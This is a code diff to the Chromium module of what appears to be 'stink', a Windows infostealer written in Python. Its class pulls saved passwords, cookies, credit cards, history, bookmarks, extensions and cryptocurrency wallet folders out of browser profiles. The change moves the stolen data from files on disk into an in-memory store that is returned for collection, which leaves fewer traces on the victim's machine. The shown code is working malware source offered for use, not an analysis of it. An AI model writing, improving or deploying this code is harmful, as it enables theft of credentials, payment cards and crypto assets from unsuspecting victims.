@@ -1,36 +1,34 @@
 from re import compile
-from typing import Tuple
+from os import path, listdir
 from base64 import b64decode
 from json import load, loads
-from shutil import copyfile, copytree
+from typing import Tuple, List
 from datetime import datetime, timedelta
-from os import path, makedirs, remove, listdir
 from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
 
-from stink.helpers import DataBlob
 from stink.enums.features import Features
-from stink.helpers import AESModeOfOperationGCM
 from stink.helpers.config import ChromiumConfig
+from stink.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage
 
 
 class Chromium:
     """
     Collects data from the browser.
     """
-    def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list):
+    def __init__(self, browser_name: str, state_path: str, browser_path: str, statuses: List):
 
         self.__browser_name = browser_name
-        self.__storage_path = storage_path
         self.__state_path = state_path
         self.__browser_path = browser_path
         self.__statuses = statuses
         self.__profiles = None
 
+        self.__storage = MemoryStorage()
         self.__config = ChromiumConfig()
-        self.__path = path.join(self.__storage_path, "Browsers", self.__browser_name)
+        self.__path = path.join("Browsers", self.__browser_name)
 
-    def _get_profiles(self) -> list:
+    def _get_profiles(self) -> List:
         """
         Collects all browser profiles.
 
@@ -58,8 +56,6 @@ class Chromium:
         - None.
         """
         if path.exists(self.__browser_path) and any(self.__statuses):
-
-            makedirs(path.join(self.__storage_path, "Browsers", self.__browser_name))
             self.__profiles = self._get_profiles()
 
     @staticmethod
@@ -171,32 +167,6 @@ class Chromium:
 
         return data
 
-    def _copy_files(self, profile: str, destination_path: str, target_path: str, error: str = "") -> bool:
-        """
-        Copies the file/directory or prints an error if it is not found.
-
-        Parameters:
-        - profile [str]: Browser profile.
-        - destination_path [str]: Destination path.
-        - target_path [str]: Path of the file or directory to be copied.
-        - error [str]: Error that will be displayed if the path does not exist.
-
-        Returns:
-        - bool: True or False depending on the success of the execution.
-        """
-        if path.isfile(target_path):
-            copy = copyfile
-        else:
-            copy = copytree
-
-        if path.exists(target_path):
-            copy(target_path, destination_path)
-        else:
-            print(f'[{self.__browser_name}]: {profile} - {error}')
-            return False
-
-        return True
-
     def _grab_passwords(self, profile: str, file_path: str) -> None:
         """
         Collects browser passwords.
@@ -224,10 +194,10 @@ class Chromium:
             for result in passwords_list
         ]
 
-        with open(path.join(self.__path, rf"{profile} Passwords.txt"), "a", encoding="utf-8") as passwords:
-            passwords.write("".join(item for item in set(temp)))
-
-        passwords.close()
+        self.__storage.add_from_memory(
+            path.join(self.__path, rf"{profile} Passwords.txt"),
+            "".join(item for item in set(temp))
+        )
 
     def _grab_cookies(self, profile: str, file_path: str) -> None:
         """
@@ -258,10 +228,10 @@ class Chromium:
             for row in cookies_list_filtered
         ]
 
-        with open(path.join(self.__path, rf"{profile} Cookies.txt"), "a", encoding="utf-8") as cookies:
-            cookies.write("\n".join(row for row in temp))
-
-        cookies.close()
+        self.__storage.add_from_memory(
+            path.join(self.__path, rf"{profile} Cookies.txt"),
+            "\n".join(row for row in temp)
+        )
 
     def _grab_cards(self, profile: str, file_path: str) -> None:
         """
@@ -290,10 +260,10 @@ class Chromium:
             for result in cards_list
         ]
 
-        with open(path.join(self.__path, rf"{profile} Cards.txt"), "a", encoding="utf-8") as cards:
-            cards.write("".join(item for item in set(temp)))
-
-        cards.close()
+        self.__storage.add_from_memory(
+            path.join(self.__path, rf"{profile} Cards.txt"),
+            "".join(item for item in set(temp))
+        )
 
     def _grab_history(self, profile: str, file_path: str) -> None:
         """
@@ -323,10 +293,10 @@ class Chromium:
             for result in history_list
         ]
 
-        with open(path.join(self.__path, rf"{profile} History.txt"), "a", encoding="utf-8") as history:
-            history.write("".join(item for item in set(temp)))
-
-        history.close()
+        self.__storage.add_from_memory(
+            path.join(self.__path, rf"{profile} History.txt"),
+            "".join(item for item in set(temp))
+        )
 
     def _grab_bookmarks(self, profile: str, file_path: str) -> None:
         """
@@ -340,15 +310,8 @@ class Chromium:
         Returns:
         - None.
         """
-        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Bookmarks")
-
-        if self._copy_files(profile, filename, file_path, "No bookmarks found") is False:
-            return
-
-        file = self._get_file(filename)
+        file = self._get_file(file_path)
         bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])
-
-        remove(filename)
 
         if not bookmarks_list:
             return
@@ -359,10 +322,10 @@ class Chromium:
             for result in bookmarks_list
         ]
 
-        with open(path.join(self.__path, rf"{profile} Bookmarks.txt"), "a", encoding="utf-8") as bookmarks:
-            bookmarks.write("".join(item for item in set(temp)))
-
-        bookmarks.close()
+        self.__storage.add_from_memory(
+            path.join(self.__path, rf"{profile} Bookmarks.txt"),
+            "".join(item for item in set(temp))
+        )
 
     def _grab_extensions(self, profile: str, extensions_path: str) -> None:
         """
@@ -370,7 +333,7 @@ class Chromium:
 
         Parameters:
         - profile [str]: Browser profile.
-        - extensions_path [str]: Path to the extensions directory.
+        - extensions_path [str]: Path to extensions directory.
 
         Returns:
         - None.
@@ -400,10 +363,10 @@ class Chromium:
 
             file.close()
 
-        with open(path.join(self.__path, rf"{profile} Extensions.txt"), "a", encoding="utf-8") as extensions:
-            extensions.write("\n".join(item for item in set(extensions_list)))
-
-        extensions.close()
+        self.__storage.add_from_memory(
+            path.join(self.__path, rf"{profile} Extensions.txt"),
+            "\n".join(item for item in set(extensions_list))
+        )
 
     def _grab_wallets(self, profile: str, wallets: str) -> None:
         """
@@ -411,7 +374,7 @@ class Chromium:
 
         Parameters:
         - profile [str]: Browser profile.
-        - wallets [str]: Path to the wallets directory.
+        - wallets [str]: Path to wallets directory.
 
         Returns:
         - None.
@@ -420,8 +383,15 @@ class Chromium:
 
             try:
 
-                filename = path.join(self.__path, rf'{profile} {wallet["name"]}')
-                self._copy_files(profile, filename, path.join(wallets, wallet["folder"]), f'No {wallet["name"]} found')
+                extension_path = path.join(wallets, wallet["folder"])
+
+                if not path.exists(extension_path):
+                    continue
+
+                self.__storage.add_from_disk(
+                    extension_path,
+                    path.join(self.__path, rf'{profile} {wallet["name"]}')
+                )
 
             except Exception as e:
                 print(f"[{self.__browser_name}]: {repr(e)}")
@@ -506,7 +476,7 @@ class Chromium:
         for profile in self.__profiles:
             self._process_profile(profile)
 
-    def run(self) -> None:
+    def run(self) -> List:
         """
         Launches the browser data collection module.
 
@@ -520,6 +490,8 @@ class Chromium:
 
             self._check_paths()
             self._check_profiles()
+
+            return self.__storage.get_data()
 
         except Exception as e:
             print(f"[{self.__browser_name}]: {repr(e)}")
